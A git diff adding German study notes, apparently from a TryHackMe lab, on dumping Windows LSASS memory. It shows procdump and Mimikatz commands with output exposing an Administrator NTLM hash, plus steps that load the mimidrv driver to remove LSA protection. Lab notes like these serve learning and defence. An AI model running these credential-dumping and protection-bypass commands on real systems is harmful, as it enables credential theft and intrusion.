@@ -220,6 +220,8 @@ Wir können die Hashes jetzt entweder cracken oder sie zur Authentifizierung nut
 
 # Local Security Authority Subsystem Service (LSASS).
 
+### What is the LSASS?
+
 Der Local Security Authority Server Service (LSASS) ist ein Windows-Prozess, der die Sicherheitsrichtlinie des Betriebssystems verwaltet und auf einem System durchsetzt.
 Das Windows-System speichert Anmeldeinformationen im LSASS-Prozess, um Benutzern den Zugriff auf Netzwerkressourcen wie Dateifreigaben, SharePoint-Sites und andere Netzwerkdienste zu ermöglichen, ohne jedes Mal Anmeldeinformationen eingeben zu müssen, wenn ein Benutzer eine Verbindung herstellt.
 
@@ -228,10 +230,85 @@ Wenn wir über Administratorrechte verfügen, können wir den Prozessspeicher vo
 
 Wir können lsass über den Task Manager dumpen, über die Kommandozeile mit Sysinternal oder auch Mimikatz.
 
+![alt text](images/image.png)
+
+
+
+```bash
+c:\>c:\Tools\SysinternalsSuite\procdump.exe -accepteula -ma lsass.exe c:\Tools\Mimikatz\lsass_dump
+
+ProcDump v10.0 - Sysinternals process dump utility
+Copyright (C) 2009-2020 Mark Russinovich and Andrew Richards
+Sysinternals - www.sysinternals.com
+
+[09:09:33] Dump 1 initiated: c:\Tools\Mimikatz\lsass_dump-1.dmp
+[09:09:33] Dump 1 writing: Estimated dump file size is 162 MB.
+[09:09:34] Dump 1 complete: 163 MB written in 0.4 seconds
+[09:09:34] Dump count reached.
+```
+
+
+
 ```hash
 mimikatz # privilege::debug
 Privilege '20' OK
+
+mimikatz # sekurlsa::logonpasswords
+
+Authentication Id : 0 ; 515377 (00000000:0007dd31)
+Session           : RemoteInteractive from 3
+User Name         : Administrator
+Domain            : THM
+Logon Server      : CREDS-HARVESTIN
+Logon Time        : 6/3/2022 8:30:44 AM
+SID               : S-1-5-21-1966530601-3185510712-10604624-500
+        msv :
+         [00000003] Primary
+         * Username : Administrator
+         * Domain   : THM
+         * NTLM     : 98d3a787a80d08385cea7fb4aa2a4261
+         * SHA1     : 64a137cb8178b7700e6cffa387f4240043192e72
+         * DPAPI    : bc355c6ce366fdd4fd91b54260f9cf70
+...
 ```
+
+***Sollte das nicht funktionieren (und das wird es nicht) müssen wir den LSASS Schutz deaktivieren***
+
+2012 hat Microsoft einen Schutz eingebaut, der es nicht mehr erlaubt auf LSASS zuzugreifen. Um die LSASS protection zu aktivieren, können wir die registry barbeiten und den RunAsPPL DWORD Wert in HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa auf 1 setzen.
+
+Wenn wir mit Mimikatz LSASS dumpen wollen, kriegen wir einen Error:
+
+```bash
+mimikatz # sekurlsa::logonpasswords
+ERROR kuhl_m_sekurlsa_acquireLSA ; Handle on memory (0x00000005)
+```
+
+Es handelt sich hierbei um einen AccessDenied Fehler. Mimikatz stellt allerdings einen mimidrv.sys Treiber bereit, der auf Kernel Level funktioniert und für uns die LSA Protection deaktiviert.
+Wir importieren diesen Treiber mit "!+"
+
+```bash
+mimikatz # !+
+[*] 'mimidrv' service not present
+[+] 'mimidrv' service successfully registered
+[+] 'mimidrv' service ACL to everyone
+[+] 'mimidrv' service started
+```
+
+Ist der Treiber geladen, deaktivieren wir LSA Protection mit folgenden Befehl:
+
+```bash
+mimikatz # !processprotect /process:lsass.exe /remove
+Process : lsass.exe
+PID 528 -> 00/00 [0-0-0]
+```
+Wir führen 
+>sekurlsa::logonpasswords 
+
+nochmal aus und erhalten den DUMP.
+
+# Windows Credential Manager
+
+
 
 
 
